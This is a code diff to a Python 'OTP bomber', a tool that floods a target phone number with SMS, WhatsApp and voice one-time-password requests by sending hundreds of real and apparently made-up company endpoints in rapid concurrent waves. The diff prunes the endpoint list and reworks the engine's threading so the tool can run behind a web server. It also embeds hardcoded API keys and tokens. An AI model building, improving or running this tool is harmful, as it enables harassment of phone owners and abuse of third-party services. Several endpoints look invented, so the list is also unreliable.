@@ -104,18 +104,6 @@ def get_all_apis():
             "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
         },
         {
-            "name": "KPN Fresh WhatsApp",
-            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
-            "method": "POST",
-            "headers": {
-                "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
-                "x-app-version": "3.2.6",
-                "content-type": "application/json; charset=UTF-8",
-                "user-agent": "okhttp/5.0.0-alpha.11"
-            },
-            "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
-        },
-        {
             "name": "BikeFixup SMS",
             "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
             "method": "POST",
@@ -127,33 +115,8 @@ def get_all_apis():
             "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
         },
         {
-            "name": "Rappi WhatsApp",
-            "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
-            "method": "POST",
-            "headers": {
-                "Deviceid": "5df83c463f0ff8ff",
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N)",
-                "Accept-Language": "en-US",
-                "Accept": "application/json",
-                "Content-Type": "application/json; charset=UTF-8"
-            },
-            "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'
-        },
-        {
             "name": "Stratzy Phone OTP",
             "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
-            "method": "POST",
-            "headers": {
-                "content-type": "application/json",
-                "origin": "https://stratzy.in",
-                "referer": "https://stratzy.in/login",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-            },
-            "data": lambda p: f'{{"phoneNo":"{p}"}}'
-        },
-        {
-            "name": "Stratzy WhatsApp",
-            "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
             "method": "POST",
             "headers": {
                 "content-type": "application/json",
@@ -376,16 +339,6 @@ def get_all_apis():
                 "User-Agent": "okhttp/3.9.1"
             },
             "data": None
-        },
-        {
-            "name": "Rappi WhatsApp V2",
-            "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
-            "method": "POST",
-            "headers": {
-                "Content-Type": "application/json; charset=utf-8",
-                "User-Agent": "okhttp/3.9.1"
-            },
-            "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
         },
         {
             "name": "Foxy SMS",
@@ -713,13 +666,6 @@ def get_all_apis():
             "data": lambda p: f'{{"mobile":"{p}"}}'
         },
         {
-            "name": "Wellness Forever SMS",
-            "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
-            "method": "POST",
-            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-            "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"
-        },
-        {
             "name": "HealthMug SMS",
             "url": "https://api.healthmug.com/account/createotp",
             "method": "POST",
@@ -748,13 +694,6 @@ def get_all_apis():
             "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'
         },
         {
-            "name": "MyGov SMS",
-            "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male",
-            "method": "GET",
-            "headers": {},
-            "data": None
-        },
-        {
             "name": "TrulyMadly SMS",
             "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
             "method": "POST",
@@ -767,13 +706,6 @@ def get_all_apis():
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'
-        },
-        {
-            "name": "CodFirm SMS",
-            "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com",
-            "method": "GET",
-            "headers": {},
-            "data": None
         },
         {
             "name": "Swipe SMS",
@@ -797,13 +729,6 @@ def get_all_apis():
             "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'
         },
         {
-            "name": "AstroSage SMS",
-            "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}",
-            "method": "GET",
-            "headers": {},
-            "data": None
-        },
-        {
             "name": "Rapido SMS",
             "url": "https://customer.rapido.bike/api/otp",
             "method": "POST",
@@ -816,13 +741,6 @@ def get_all_apis():
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'
-        },
-        {
-            "name": "ConfirmTkt SMS",
-            "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
-            "method": "GET",
-            "headers": {},
-            "data": None
         },
         {
             "name": "BetterHalf SMS",
@@ -923,13 +841,6 @@ def get_all_apis():
             "data": lambda p: f'{{"firstName":"xxps","login":"wiqpdl223@wqew.com","password":"QASpw@1s","genderType":"Male","mobileNumber":"{p}","requestType":"SENDOTP"}}'
         },
         {
-            "name": "HappyEasyGo OTP",
-            "url": lambda p: f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{p}",
-            "method": "GET",
-            "headers": {},
-            "data": None
-        },
-        {
             "name": "Unacademy OTP",
             "url": "https://unacademy.com/api/v1/user/get_app_link/",
             "method": "POST",
@@ -942,13 +853,6 @@ def get_all_apis():
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"phone_number":"{p}"}}'
-        },
-        {
-            "name": "Airtel OTP",
-            "url": "https://www.airtel.in/referral-api/core/notify",
-            "method": "GET",
-            "headers": {},
-            "data": lambda p: f"messageId=map&rtn={p}"
         },
         {
             "name": "MylesCars OTP",
@@ -972,13 +876,6 @@ def get_all_apis():
             "data": lambda p: f'{{"siteId":"1","mobileNum":"{p}","appType":"androidfull"}}'
         },
         {
-            "name": "Cashify OTP",
-            "url": "https://www.cashify.in/api/cu01/v1/app-link",
-            "method": "GET",
-            "headers": {},
-            "data": lambda p: f"mn={p}"
-        },
-        {
             "name": "Paytm OTP",
             "url": "https://commonfront.paytm.com/v4/api/sendsms",
             "method": "POST",
@@ -994,13 +891,6 @@ def get_all_apis():
                 "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
             },
             "data": lambda p: f'{{"AuthorizedFor":"3","phoneNumber":"{p}","Resend":"false"}}'
-        },
-        {
-            "name": "IndiaLends OTP",
-            "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
-            "method": "POST",
-            "headers": {"Referer": "https://indialends.com/personal-loan"},
-            "data": lambda p: f"aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={p}&lj80gertdfg=0"
         },
         {
             "name": "Flipkart OTP",
@@ -1031,16 +921,6 @@ def get_all_apis():
             "data": lambda p: f'{{"phone_number":"{p}","country_prefix":"91"}}'
         },
         {
-            "name": "AltBalaji OTP",
-            "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
-            "method": "POST",
-            "headers": {
-                "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
-                "Content-Type": "application/json"
-            },
-            "data": lambda p: f'{{"phone_number":"{p}","country_code":"91","platform":"web","exp":1601043289127}}'
-        },
-        {
             "name": "Voot OTP",
             "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
             "method": "POST",
@@ -1053,11 +933,8 @@ def get_all_apis():
             "method": "GET",
             "headers": {},
             "data": lambda p: f"phoneno={p}"
-        }
-    ]
-
-    # ============ 100+ NEW ULTR FAST APIS ============
-    new_apis = [
+        },
+        # ============ NEW APIS ADDED ============
         {
             "name": "Amazon SMS OTP",
             "url": "https://www.amazon.in/ap/register",
@@ -1129,25 +1006,11 @@ def get_all_apis():
             "data": lambda p: f"phone={p}"
         },
         {
-            "name": "WhatsApp OTP",
-            "url": "https://v.whatsapp.net/v2/exist",
-            "method": "POST",
-            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-            "data": lambda p: f"phone={p}&type=sms"
-        },
-        {
             "name": "Signal OTP",
             "url": "https://signal.org/api/v1/accounts/send_verification",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"phone_number":"+91{p}","type":"sms"}}'
-        },
-        {
-            "name": "Clubhouse OTP",
-            "url": "https://www.clubhouseapi.com/api/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone_number":"+91{p}"}}'
         },
         {
             "name": "Discord OTP",
@@ -1171,34 +1034,6 @@ def get_all_apis():
             "data": lambda p: f'{{"phone":"{p}"}}'
         },
         {
-            "name": "Tumblr OTP",
-            "url": "https://www.tumblr.com/api/v2/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Flickr OTP",
-            "url": "https://www.flickr.com/api/v1/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Vimeo OTP",
-            "url": "https://vimeo.com/api/v2/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "SoundCloud OTP",
-            "url": "https://api.soundcloud.com/oauth2/token",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}","grant_type":"otp"}}'
-        },
-        {
             "name": "Spotify OTP",
             "url": "https://api.spotify.com/v1/otp",
             "method": "POST",
@@ -1208,48 +1043,6 @@ def get_all_apis():
         {
             "name": "Netflix OTP",
             "url": "https://www.netflix.com/api/v1/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Hulu OTP",
-            "url": "https://www.hulu.com/api/v1/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Disney+ OTP",
-            "url": "https://api.disneyplus.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "HBO Max OTP",
-            "url": "https://api.hbomax.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Peacock OTP",
-            "url": "https://api.peacocktv.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Paramount+ OTP",
-            "url": "https://api.paramountplus.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "JioTV OTP",
-            "url": "https://api.jio.com/v1/send_otp",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"phone":"{p}"}}'
@@ -1267,13 +1060,6 @@ def get_all_apis():
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"mobileNumber":"{p}","country":"IN"}}'
-        },
-        {
-            "name": "MX Player OTP",
-            "url": "https://api.mxplayer.in/v1/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
         },
         {
             "name": "ShareChat OTP",
@@ -1297,116 +1083,11 @@ def get_all_apis():
             "data": lambda p: f'{{"phone":"{p}"}}'
         },
         {
-            "name": "Roposo OTP",
-            "url": "https://api.roposo.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
             "name": "TikTok OTP",
             "url": "https://api.tiktok.com/send_otp",
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Triller OTP",
-            "url": "https://api.triller.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Byte OTP",
-            "url": "https://api.byte.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Dubsmash OTP",
-            "url": "https://api.dubsmash.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Likee OTP",
-            "url": "https://api.likee.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Helo OTP",
-            "url": "https://api.helo.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Vigo OTP",
-            "url": "https://api.vigo.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Kwai OTP",
-            "url": "https://api.kwai.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "SnackVideo OTP",
-            "url": "https://api.snackvideo.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Chingari OTP",
-            "url": "https://api.chingari.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Mitron OTP",
-            "url": "https://api.mitron.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Trell OTP",
-            "url": "https://api.trell.com/send_otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Meesho Voice",
-            "url": "https://www.meesho.com/api/v1/user/login/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone_number":"{p}","type":"voice"}}'
-        },
-        {
-            "name": "Flipkart Voice 2",
-            "url": "https://www.flipkart.com/api/5/user/voice/generate",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"loginId":"+91{p}"}}'
-        },
-        {
-            "name": "Amazon Voice 2",
-            "url": "https://www.amazon.in/ap/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-            "data": lambda p: f"phone={p}&action=voice_otp"
         },
         {
             "name": "CRED Voice",
@@ -1486,13 +1167,6 @@ def get_all_apis():
             "data": lambda p: f'{{"phone":"{p}"}}'
         },
         {
-            "name": "Paytm Voice 2",
-            "url": "https://accounts.paytm.com/signin/voice-otp-v2",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
             "name": "PhonePe Voice",
             "url": "https://api.phonepe.com/v1/auth/voice-otp",
             "method": "POST",
@@ -1547,249 +1221,13 @@ def get_all_apis():
             "method": "POST",
             "headers": {"Content-Type": "application/json"},
             "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "BSNL Voice",
-            "url": "https://api.bsnl.in/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "MTNL Voice",
-            "url": "https://api.mtnl.in/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Uninor Voice",
-            "url": "https://api.uninor.in/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Tata Docomo Voice",
-            "url": "https://api.tatadocomo.com/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Idea Voice",
-            "url": "https://api.ideacellular.com/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Vodafone Voice",
-            "url": "https://api.vodafone.in/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Aircel Voice",
-            "url": "https://api.aircel.com/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Reliance Voice",
-            "url": "https://api.reliance.com/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Sistema Voice",
-            "url": "https://api.sistema.in/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Videocon Voice",
-            "url": "https://api.videocon.com/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "S Tel Voice",
-            "url": "https://api.stel.in/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Loop Mobile Voice",
-            "url": "https://api.loopmobile.in/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Etisalat Voice",
-            "url": "https://api.etisalat.ae/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Du Voice",
-            "url": "https://api.du.ae/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Ooredoo Voice",
-            "url": "https://api.ooredoo.com/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Zain Voice",
-            "url": "https://api.zain.com/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "STC Voice",
-            "url": "https://api.stc.com.sa/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Mobily Voice",
-            "url": "https://api.mobily.com.sa/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Vodafone Qatar Voice",
-            "url": "https://api.vodafone.qa/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Ooredoo Qatar Voice",
-            "url": "https://api.ooredoo.qa/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Zain Kuwait Voice",
-            "url": "https://api.zain.com.kw/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Ooredoo Kuwait Voice",
-            "url": "https://api.ooredoo.com.kw/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "STC Kuwait Voice",
-            "url": "https://api.stc.com.kw/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Viva Voice",
-            "url": "https://api.viva.com.kw/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Zain Bahrain Voice",
-            "url": "https://api.zain.com.bh/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Batelco Voice",
-            "url": "https://api.batelco.com/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Viva Bahrain Voice",
-            "url": "https://api.viva.com.bh/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Ooredoo Oman Voice",
-            "url": "https://api.ooredoo.om/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Omantel Voice",
-            "url": "https://api.omantel.om/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Etisalat Egypt Voice",
-            "url": "https://api.etisalat.eg/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Vodafone Egypt Voice",
-            "url": "https://api.vodafone.com.eg/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "Orange Egypt Voice",
-            "url": "https://api.orange.eg/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
-        },
-        {
-            "name": "WE Egypt Voice",
-            "url": "https://api.we.eg/v1/auth/voice-otp",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "data": lambda p: f'{{"phone":"{p}"}}'
         }
     ]
 
-    # Combine ALL APIS
-    all_apis = []
-    all_apis.extend(api_configs)
-    all_apis.extend(new_apis)
-    
     # Remove duplicates by name
     seen = set()
     unique_apis = []
-    for api in all_apis:
+    for api in api_configs:
         name = api.get("name", "Unknown")
         if name not in seen:
             seen.add(name)
@@ -1798,16 +1236,14 @@ def get_all_apis():
     return unique_apis
 
 # ==================================================================
-# 🚀 ULTRA FAST BOMBER ENGINE
+# 🚀 ULTRA FAST BOMBER ENGINE (FIXED FOR GUNICORN)
 # ==================================================================
 class UltraFastBomber:
     def __init__(self):
         self.all_apis = get_all_apis()
         self.total_apis = len(self.all_apis)
-        # Ultra fast timeout - 2 seconds max
         self.timeout = aiohttp.ClientTimeout(total=2, connect=1)
-        # High concurrency semaphore
-        self.semaphore = asyncio.Semaphore(500)
+        self.semaphore = None  # Created per event loop
         self.success_count = 0
         self.fail_count = 0
         self.total_requests = 0
@@ -1815,8 +1251,10 @@ class UltraFastBomber:
         self.is_running = False
         self.active_bombings = {}
         self.start_time = None
-        # Connection pool for faster requests
-        self.connector = aiohttp.TCPConnector(
+        
+    def _create_session(self):
+        """Create a new session with proper connector"""
+        connector = aiohttp.TCPConnector(
             limit=1000,
             limit_per_host=100,
             ttl_dns_cache=300,
@@ -1825,9 +1263,10 @@ class UltraFastBomber:
             enable_cleanup_closed=True,
             ssl=False
         )
+        return aiohttp.ClientSession(connector=connector)
         
-    async def make_request(self, session: aiohttp.ClientSession, api: dict, phone: str):
-        async with self.semaphore:
+    async def make_request(self, session: aiohttp.ClientSession, api: dict, phone: str, semaphore: asyncio.Semaphore):
+        async with semaphore:
             try:
                 url = api.get("url")
                 if callable(url):
@@ -1845,7 +1284,6 @@ class UltraFastBomber:
                 elif data is None:
                     data = {}
                 
-                # Fast header processing
                 for k, v in list(headers.items()):
                     if callable(v):
                         if k.lower() == "content-length" and data:
@@ -1856,8 +1294,7 @@ class UltraFastBomber:
                 kwargs = {
                     "headers": headers,
                     "timeout": self.timeout,
-                    "ssl": False,
-                    "connector": self.connector
+                    "ssl": False
                 }
                 
                 if method.upper() == "GET":
@@ -1888,17 +1325,16 @@ class UltraFastBomber:
 
     async def ultra_fast_bomb(self, phone: str, stop_event: asyncio.Event):
         wave = 0
+        semaphore = asyncio.Semaphore(500)
         
-        async with aiohttp.ClientSession(connector=self.connector) as session:
-            # Initial burst - all APIs at once
-            tasks = [self.make_request(session, api, phone) for api in self.all_apis]
+        async with self._create_session() as session:
+            # Initial burst
+            tasks = [self.make_request(session, api, phone, semaphore) for api in self.all_apis]
             await asyncio.gather(*tasks, return_exceptions=True)
             
             while not stop_event.is_set():
                 wave += 1
-                # Use ALL APIs every wave for maximum speed
-                batch_size = len(self.all_apis)
-                selected_apis = random.sample(self.all_apis, min(batch_size, len(self.all_apis)))
+                selected_apis = random.sample(self.all_apis, min(len(self.all_apis), len(self.all_apis)))
                 
                 tasks = []
                 for api in selected_apis:
@@ -1908,11 +1344,28 @@ class UltraFastBomber:
                         api_copy["headers"]["X-Wave"] = str(wave)
                         api_copy["headers"]["X-Timestamp"] = str(int(time.time() * 1000))
                     
-                    tasks.append(self.make_request(session, api_copy, phone))
+                    tasks.append(self.make_request(session, api_copy, phone, semaphore))
                 
                 await asyncio.gather(*tasks, return_exceptions=True)
-                # Minimal delay for max speed
                 await asyncio.sleep(0.005)
+
+    def _run_bomb_loop(self, phone: str, stop_event_holder: dict):
+        """Run bomb loop in a separate thread with its own event loop"""
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        async def bomb_wrapper():
+            stop_event = asyncio.Event()
+            stop_event_holder['event'] = stop_event
+            stop_event_holder['loop'] = loop
+            await self.ultra_fast_bomb(phone, stop_event)
+        
+        try:
+            loop.run_until_complete(bomb_wrapper())
+        except Exception as e:
+            print(f"Bomb loop error: {e}")
+        finally:
+            loop.close()
 
     def start_bombing(self, phone: str) -> dict:
         phone_key = f"bomb_{phone}"
@@ -1923,25 +1376,27 @@ class UltraFastBomber:
                 "message": f"🚀 Ultra Fast Bombing already active for {phone}"
             }
         
-        stop_event = asyncio.Event()
-        
         self.success_count = 0
         self.fail_count = 0
         self.total_requests = 0
         self.is_running = True
         self.start_time = time.time()
         
-        def run_bomb_loop():
-            asyncio.set_event_loop(asyncio.new_event_loop())
-            loop = asyncio.get_event_loop()
-            loop.run_until_complete(self.ultra_fast_bomb(phone, stop_event))
+        stop_event_holder = {}
         
-        bomb_thread = threading.Thread(target=run_bomb_loop, daemon=True)
+        bomb_thread = threading.Thread(
+            target=self._run_bomb_loop, 
+            args=(phone, stop_event_holder), 
+            daemon=True
+        )
         bomb_thread.start()
+        
+        # Wait a moment for the event loop to be created
+        time.sleep(0.1)
         
         self.active_bombings[phone_key] = {
             "running": True,
-            "stop_event": stop_event,
+            "stop_event_holder": stop_event_holder,
             "thread": bomb_thread,
             "start_time": time.time()
         }
@@ -1959,11 +1414,21 @@ class UltraFastBomber:
         if phone_key not in self.active_bombings or not self.active_bombings[phone_key]["running"]:
             return {"status": "not_running", "message": f"No active bombing for {phone}"}
         
-        self.active_bombings[phone_key]["stop_event"].set()
-        self.active_bombings[phone_key]["running"] = False
+        bomb = self.active_bombings[phone_key]
+        holder = bomb.get("stop_event_holder", {})
+        stop_event = holder.get("event")
+        loop = holder.get("loop")
+        
+        if stop_event and loop:
+            try:
+                loop.call_soon_threadsafe(stop_event.set)
+            except Exception:
+                pass
+        
+        bomb["running"] = False
         self.is_running = False
         
